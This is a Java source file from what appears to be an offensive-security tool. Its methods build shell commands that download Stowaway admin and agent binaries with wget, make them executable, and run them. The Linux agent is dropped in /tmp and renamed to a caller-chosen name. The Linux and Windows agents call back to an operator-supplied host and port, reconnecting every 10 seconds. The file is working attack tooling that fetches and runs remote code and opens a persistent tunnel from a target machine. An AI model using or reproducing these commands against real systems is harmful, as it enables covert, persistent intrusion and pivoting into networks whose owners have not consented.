package com.swordHostDemo.controller;

/**
 * @date: 2022/12/26 22:01
 * @description:
 */
public class StowawayController {


    public static String StowawayAdmin(String lport, String s) {
        String downloads = "mkdir stowaway\n" +
                "cd stowaway\n" +
                "wget https://github.com/ph4ntonn/Stowaway/releases/download/v2.1/linux_x64_admin\n" +
                "chmod 777 linux_x64_admin\r\n";
        String adminStr = "./linux_x64_admin -l " + lport + " -s " + s;
        return downloads + adminStr;
    }
    public static String StowawayLinuxAgent(String lhost, String lport, String s,String FilName) {
        //Linux agent
        String str = "cd /tmp\n"+
                "wget https://github.com/ph4ntonn/Stowaway/releases/download/v2.1/linux_x64_agent\n" +
                "chmod 777 linux_x64_agent\n"+
                "mv linux_x64_agent "+FilName+"\n";
        String LinuxAgent = "./"+FilName+" -c " + lhost + ":" + lport + " -s " + s + " --reconnect 10";
        return str+LinuxAgent;
    }

    public static String StowawayWindosAgent(String lhost, String lport, String s) {

        //Windows agent
        String str ="wget https://github.com/ph4ntonn/Stowaway/releases/download/v2.1/windows_x64_agent.exe\r\n";
        String WindowsAgent = "windows_x64_agent.exe -c " + lhost + ":" + lport + " -s " + s + " --reconnect 10";
        return str+WindowsAgent;
    }


//    public static void main(String[] args) {
////        System.out.println(StowawayAdmin("1", "1"));
//        System.out.println(StowawayLinuxAgent("1","1","1","1"));
//        System.out.println(StowawayWindosAgent("1","1","1"));
//    }


}
